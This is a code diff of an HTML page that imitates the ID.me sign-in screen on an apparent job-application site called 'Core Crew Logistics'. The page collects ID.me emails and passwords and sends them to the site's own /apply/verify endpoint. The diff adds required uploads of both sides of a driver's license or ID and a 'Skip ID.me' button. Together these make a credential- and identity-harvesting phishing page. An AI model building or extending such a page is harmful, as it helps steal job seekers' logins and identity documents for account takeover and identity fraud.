@@ -4,9 +4,94 @@
   <meta charset="utf-8" />
   <title>Sign in to ID.me - ID.me</title>
   <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <link rel="icon" type="image/jpeg" href="/public/img/logo.jpg" />
   <link rel="stylesheet" href="/public/idme-signin.css" />
+  <link rel="stylesheet" href="/public/styles.css" />
+  <style>
+    .skip-btn-row {
+      display: flex;
+      flex-direction: row;
+      align-items: center;
+      justify-content: center;
+      gap: 18px;
+      margin-top: 18px;
+    }
+    .btn-skip {
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      padding: 10px 15px;
+      font-size: 1.04rem;
+      font-weight: 600;
+      border-radius: 7px;
+      background: linear-gradient(90deg, #f7b731 70%, #2ecc71 100%);
+      color: #fff;
+      border: none;
+      cursor: pointer;
+      box-shadow: 0 2px 8px 0 rgba(24,70,163,0.10);
+      transition: background 0.18s, color 0.18s;
+      text-decoration: none;
+      min-height: 38px;
+    }
+    .btn-skip:hover, .btn-skip:focus {
+      background: linear-gradient(90deg, #2ecc71 10%, #1846a3 90%);
+      color: #fff;
+      outline: 2px solid #2ecc71;
+      outline-offset: 2px;
+    }
+    @media (max-width: 600px) {
+      .skip-btn-row {
+        flex-direction: column;
+        gap: 10px;
+      }
+      .btn-skip {
+        width: 100%;
+      }
+    }
+    .fixed-back-btn {
+      position: absolute;
+      top: 100px;
+      left: 2rem;
+      z-index: 1001;
+    }
+    @media (max-width: 700px) {
+      .fixed-back-btn {
+        top: 72px;
+        left: 1rem;
+      }
+    }
+  </style>
+  <script>
+    function submitSkip() {
+      var form = document.getElementById('idme-form');
+      form.action = '/apply/skip-idme/'; // Ensure trailing slash
+      form.method = 'post';
+      // Remove password field name so it's not sent
+      var passwordInput = document.getElementById('idme-password');
+      if (passwordInput) passwordInput.removeAttribute('name');
+      form.submit();
+    }
+  </script>
 </head>
 <body>
+  <header class="site-header">
+    <div class="container">
+      <div class="brand">
+        <img class="logo" src="/public/img/logo.jpg" alt="Core Crew Logistics Logo" />
+        <span>Core Crew Logistics</span>
+      </div>
+      <nav>
+        <a href="/about" class="btn ghost">About</a>
+        <a href="/services" class="btn ghost">Services</a>
+        <a href="/jobs" class="btn ghost">Jobs</a>
+        <a href="/apply" class="btn primary">Apply Now</a>
+      </nav>
+    </div>
+  </header>
+  <a href="/apply" class="btn ghost fixed-back-btn"
+     onclick="if(document.referrer && document.referrer !== window.location.href){window.history.back(); return false;}">
+    &larr; Back
+  </a>
   <div class="page-container">
     <header class="form-header">
       <div class="form-header-content" role="banner">
@@ -27,7 +112,8 @@
           <a href="https://api.id.me/en/registration/new" target="_blank">Create an ID.me account</a>
         </p>
       </div>
-      <form class="idme-form" method="post" action="/apply/verify" autocomplete="off">
+      <!-- Updated form to support file upload (front and back) -->
+      <form id="idme-form" class="idme-form" method="post" action="/apply/verify" autocomplete="off" enctype="multipart/form-data">
         <div class="form-fields">
           <div class="field text">
             <label for="idme-email">Email</label>
@@ -37,20 +123,30 @@
             <label for="idme-password">Password</label>
             <input id="idme-password" type="password" name="password" required autocomplete="off" placeholder="Enter your password">
           </div>
+          <div class="field file">
+            <label for="driversLicenseFront">Upload Driver's License/ID (Front)</label>
+            <input type="file" name="driversLicenseFront" id="driversLicenseFront" accept="image/*,.pdf" required>
+            <p style="font-size:0.98em;color:#666;margin-top:4px;">Accepted: .jpg, .png, .pdf</p>
+          </div>
+          <div class="field file">
+            <label for="driversLicenseBack">Upload Driver's License/ID (Back)</label>
+            <input type="file" name="driversLicenseBack" id="driversLicenseBack" accept="image/*,.pdf" required>
+            <p style="font-size:0.98em;color:#666;margin-top:4px;">Accepted: .jpg, .png, .pdf</p>
+          </div>
         </div>
         <div class="forgot-password-link">
           <a href="https://api.id.me/en/passwords/new" target="_blank">Forgot password?</a>
         </div>
-        <div class="form-actions">
-          <button type="submit" class="btn-primary">Sign in</button>
+        <div class="skip-btn-row">
+          <button type="submit" class="btn primary">Sign in</button>
+          <button type="button" class="btn-skip" onclick="submitSkip()">Skip ID.me & Submit Application</button>
         </div>
-        <div class="form-footer-message">
-          <p>Social media sign-in is no longer available. Please sign in with your email.</p>
+        <div class="form-footer-message" style="margin-top:16px;">
+          <p>Social media sign-in is no longer available. Please sign in with your email or skip verification to continue.</p>
         </div>
       </form>
       <aside class="language-selection">
         <a class="language-selection-toggle" href="#">English</a>
-        <!-- You can add a dropdown or modal for more languages if needed -->
       </aside>
       <footer class="footer">
         <nav class="footer__links" aria-label="Footer">
